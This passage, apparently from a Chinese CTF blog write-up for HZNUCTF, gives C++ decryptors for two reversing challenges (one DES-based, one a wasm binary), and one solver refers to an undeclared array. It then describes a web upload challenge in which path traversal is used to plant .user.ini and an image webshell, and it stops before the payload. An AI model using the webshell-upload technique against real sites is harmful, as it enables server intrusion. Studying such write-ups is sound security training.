punctuation\">,</span> <span class=\"token number\">0x3C19151B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23063B3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34293830</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03062108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x380B3F2A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x260E063D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3009141B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E223D3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x300B0124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x062A1700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11093D14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E22262B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1208083E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0E22262B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1208083E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x062A1700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11093D14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E223D3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x300B0124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x260E063D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3009141B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03062108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x380B3F2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23063B3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34293830</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13043A05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C19151B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03052031</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34312B37</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x13151F32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24112618</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01050927</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25150D29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0915123C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27100E27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x090D1703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0514372E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x09292E17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07122920</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C091B18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0512011F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2829051D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09123B0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C0B3C36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09221A0A</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x00000084</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000003</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000022</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000014</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000BE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000DF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000075</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000076</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000006F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000CD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000002A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000005D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D7</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0000004D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000B2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000005F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000006</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000098</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000A8</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000F7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000023</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000054</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000065</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000007A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000046</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003D</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000F7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000B2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000007A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000C2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000CF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000001A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000AE</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000016</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000C7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000015</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000030</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000FD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000AB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000FE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000095</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000A7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000001F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Enc<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四字节一组翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> a <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> d<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">// DES解密（用后32个key）</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">des_encrypt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>Enc <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">+</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四字节一组翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> a <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> d<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span>\n        Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HZNUCTF&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 逆向初始字符串变换</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        std<span class=\"token double-colon punctuation\">::</span>string tmp1<span class=\"token punctuation\">;</span>\n        tmp1 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        tmp1 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        std<span class=\"token double-colon punctuation\">::</span>string tmp2<span class=\"token punctuation\">;</span>\n        tmp2 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        tmp2 <span class=\"token operator\">+=</span> Enc<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">stoi</span><span class=\"token punctuation\">(</span>tmp1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">stoi</span><span class=\"token punctuation\">(</span>tmp2<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#125;\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p>\n<h3 id=\"Index\"><a href=\"#Index\" class=\"headerlink\" title=\"Index\"></a>Index</h3><p>下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。</p>\n<p>左题目附件，右正常wasm文件。</p>\n<p><img src=\"/images/1744633170178-32.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>使用ghidra进行分析，因为有专门的wasm反编译插件。</p>\n<p>通过Exports定位到main函数，以下是经过我重命名后的结果。</p>\n<p><img src=\"/images/1744633170178-33.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>首先是输入key，然后判断和该处明文是否相等。</p>\n<p>然后将Key xor上0x51。</p>\n<p><img src=\"/images/1744633170178-34.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170178-35.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。</p>\n<p><img src=\"/images/1744633170178-36.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170179-37.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>第二步加密（四个字节一组加密）：</p>\n<ol>\n<li>用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。</li>\n<li>调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。</li>\n<li>再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**”TGCTF404”**。</li>\n</ol>\n<p><img src=\"/images/1744633170179-38.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170179-39.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。</p>\n<p><img src=\"/images/1744633170179-40.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。</p>\n<p>解密代码：</p>\n<pre class=\"language-Cpp\" data-language=\"Cpp\"><code class=\"language-Cpp\">#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n\n&#x2F;&#x2F; 0x10da0处数据\nunsigned char box[] &#x3D; &#123;\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,\n    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,\n    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,\n    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,\n    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,\n    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,\n    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,\n    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,\n    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,\n    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,\n    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,\n    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,\n    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,\n    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,\n    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,\n    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,\n    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;\n    \n&#x2F;&#x2F; 0x10ea0处数据\nunsigned char box_ori[] &#x3D; &#123;\n    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,\n    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,\n    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,\n    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,\n    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,\n    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,\n    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,\n    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,\n    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,\n    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,\n    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,\n    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,\n    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,\n    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,\n    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48&#125;;\n    \nvoid unnamed_function_10(byte *param1, int param2)\n&#123;\n    for (int i &#x3D; 0; i &lt; 0x100; i &#x3D; i + 1)\n    &#123;\n        param1[i] &#x3D; param1[i] ^ (byte)param2;\n    &#125;\n    return;\n&#125;\n\nunsigned char Enc[] &#x3D; &#123;\n    0x84, 0x00, 0x00, 0x00,\n    0x1c, 0x00, 0x00, 0x00,\n    0x6b, 0x00, 0x00, 0x00,\n    0xf7, 0x00, 0x00, 0x00,\n    0x49, 0x00, 0x00, 0x00,\n    0x22, 0x00, 0x00, 0x00,\n    0xd6, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x50, 0x00, 0x00, 0x00,\n    0x7b, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0xf4, 0x00, 0x00, 0x00,\n    0x46, 0x00, 0x00, 0x00,\n    0xa9, 0x00, 0x00, 0x00,\n    0x83, 0x00, 0x00, 0x00,\n    0x62, 0x00, 0x00, 0x00,\n    0xd1, 0x00, 0x00, 0x00,\n    0x32, 0x00, 0x00, 0x00,\n    0x80, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x6a, 0x00, 0x00, 0x00,\n    0x10, 0x00, 0x00, 0x00,\n    0xa3, 0x00, 0x00, 0x00,\n    0xf2, 0x00, 0x00, 0x00,\n    0xe2, 0x00, 0x00, 0x00,\n    0xb8, 0x00, 0x00, 0x00,\n    0x0b, 0x00, 0x00, 0x00,\n    0x76, 0x00, 0x00, 0x00,\n    0xb0, 0x00, 0x00, 0x00,\n    0xdc, 0x00, 0x00, 0x00,\n    0x02, 0x00, 0x00, 0x00,\n    0x51, 0x00, 0x00, 0x00&#125;;\n\nvoid Dec_2(unsigned char *Input, unsigned char *Key)\n&#123;\n    static int c &#x3D; 0;\n    int iVar1 &#x3D; (int)Key[c] &gt;&gt; 4;\n    DWORD uVar2 &#x3D; (int)Key[c] &amp; 0xf;\n    c++;\n    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));\n    unsigned char key_o[] &#x3D; &quot;TGCTF404&quot;;\n    for (int i &#x3D; 0; i &lt; 4; i++)\n    &#123;\n        Input[i] &#x3D; Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];\n        Input[i] &#x3D; Input[i] ^ key_o[i];\n    &#125;\n&#125;\n\nvoid decrypt(unsigned char *Input, int length)\n&#123;\n    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;\n\n    for (int i &#x3D; 0; i &lt; 8; i++)\n        Key[i] ^&#x3D; 0x51;\n\n    for (int i &#x3D; 0; i &lt; length; i +&#x3D; 4)\n    &#123;\n        Dec_2((unsigned char *)(Input + i), Key);\n    &#125;\n\n    srand(0x194);\n\n    int swaps[32][2];\n    for (int i &#x3D; 0; i &lt; 32; i++)\n    &#123;\n        auto Value &#x3D; rand();\n        Value &#x3D; i + Value &#x2F; (0x7fff &#x2F; (32 - i) + 1);\n        swaps[i][0] &#x3D; i;\n        swaps[i][1] &#x3D; Value;\n    &#125;\n\n    for (int i &#x3D; 31; i &gt;&#x3D; 0; i--)\n    &#123;\n        unsigned char temp &#x3D; Input[swaps[i][0]];\n        Input[swaps[i][0]] &#x3D; Input[swaps[i][1]];\n        Input[swaps[i][1]] &#x3D; temp;\n    &#125;\n&#125;\n\nint main()\n&#123;\n    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;\n    unsigned char Enc_flag[32]&#123;&#125;;\n    \n    for (int i &#x3D; 0; i &lt; 32; i++)\n        Enc_flag[i] &#x3D; *(int *)((byte *)Enc + i * 4);\n\n    decrypt(Enc_flag, 32);\n\n    printf(&quot;%.32s\\n&quot;, Enc_flag);\n    return 0;\n&#125;</code></pre>\n\n<p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ez-upload\"><a href=\"#ez-upload\" class=\"headerlink\" title=\"(ez)upload\"></a>(ez)upload</h3><p>扫目录 有 upload.php.bak 翻源码。name处存在穿越。</p>\n<p>可以上传.user.ini。而只有上级目录有php文件可以触发。</p>\n<p>因此。我们传图片马和.user.ini到上级目录。等待触发即可。</p>\n<p>payload：</p>\n<pre class=\"language-http\" 